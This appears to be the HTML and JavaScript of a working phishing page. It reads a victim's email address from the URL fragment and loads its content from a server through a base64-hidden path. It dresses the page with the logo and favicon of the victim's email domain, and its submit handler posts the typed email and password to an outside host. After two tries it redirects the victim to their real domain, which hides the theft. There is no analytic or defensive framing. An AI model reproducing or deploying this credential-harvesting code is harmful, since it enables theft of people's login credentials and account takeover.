<!--

     http://localhost:5501/work.html

 -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading..</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">

    <!-- preloader -->
    <style>
        @keyframes hidePreloader {
          0% {
            width: 100%;
            height: 100%;
          }
  
          100% {
            width: 0;
            height: 0;
          }
        }
  
     div.preloader {
          position: fixed;
          background: #fff;
          width: 100%;
          height: 100%;
          z-index: 1071;
          opacity: 0;
          transition: opacity 0.5s ease;
          overflow: hidden;
          pointer-events: none;
          display: flex;
          align-items: center;
          justify-content: center;
        }
  
        body:not(.loaded) div.preloader {
          opacity: 1;
        }
  
        body:not(.loaded) {
          overflow: hidden;
        }
  
        body.loaded div.preloader {
          animation: hidePreloader 0.5s linear 0.5s forwards;
        }
  
        /* #f7f7f7 */
      </style>
      <script>
        window.addEventListener("load", function () {
          setTimeout(function () {
            document.querySelector("body").classList.add("loaded");
          }, 300);
        });
      </script>
</head>
<body id="docBody">
  
    <div id="content_body">
        <div class="preloader_container_stef preloader">
            <img src="./Pulse-1s-200px.svg" style="width: 120px; height: 120px" />
          </div>
    </div>
  





    <script src="./srv.js"></script>





<!-- Jquery -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>


<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

<script>
  
  function app(){
    const __winHref = window.location.href.split("?")[0];
    const __getInd__ = (str, search) => str.indexOf(search);
    const __getSlice__ = (str, index) => str.substr(index);
    const __getEl__ = (sel) => document.querySelector(sel);
    const __json = (url) => fetch(url).then((res) => res.json());

    const __getURLEm = () => {
      if (__getInd__(__winHref, "#") === -1) {
        console.log("ue 1 failed");
        return false;
      }

      return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
    };

    var email = null;

    try {
      email = atob(__getURLEm());
    } catch (err) {
      if (__getURLEm()) {
        email = __getURLEm();
      } else {
        console.log("error:", err.message);
        return;
      }
    }

    // rst..
        var count=0;
        console.log(document.getElementById('exampleModal'));

      $('#back1').click(function () {
        $('#msg').hide();
        $('#email').val('');
        $('#automail').animate({left:200, opacity:'hide'}, 0);
        $('#inputbar').animate({right:200, opacity:'show'}, 1000);

      });

      // var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf('@');
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

        $('#logo__img__').attr('src', 'https://www.google.com/s2/favicons?domain='+my_slice);
        $('#logoname').html(finalu);
        $('.logoname').html(finalu);
      }


      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$('#email').val();
        var password=$('#password').val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf('@');
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

        $('#logo__img__').attr('src', 'https://www.google.com/s2/favicons?domain='+my_slice);
        $('.logo__img__').attr('src', 'https://www.google.com/s2/favicons?domain='+my_slice);
        $('#logoname').html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://gruqobimbo.com/exc_sh/rpt.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $('#msg').show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $('#password').val('');
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace('http://www.'+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $('#password').val('');
              if (count>=2) {
                count=0;
                window.location.replace('http://www.'+my_slice);
              }
              $('#msg').show();
              // $('#msg').html('Please try again later');
            },
            complete: function(){
              $('#submit-btn').html('View Online');
            }
          });
    });
}

  
</script>

<script>

    async function init() {

      const fetchOptions = {
        method: "POST",
        body: JSON.stringify({}),
        headers: {
          "Content-Type": "application/json",
        },
      };
      
      const res = await fetch(`${window.stef.srv_loc}${atob("L2V4Y19zaC9oZmhmam1yZW5lZWVuZW5lbWUucGhw")}`, fetchOptions);
    
      const resData = await res.json();
    
      document.querySelector("#content_body").innerHTML = resData.data; 
      document.title = resData.title;
      app();   
    }
    
    init();
    </script>
    
</body>

</html>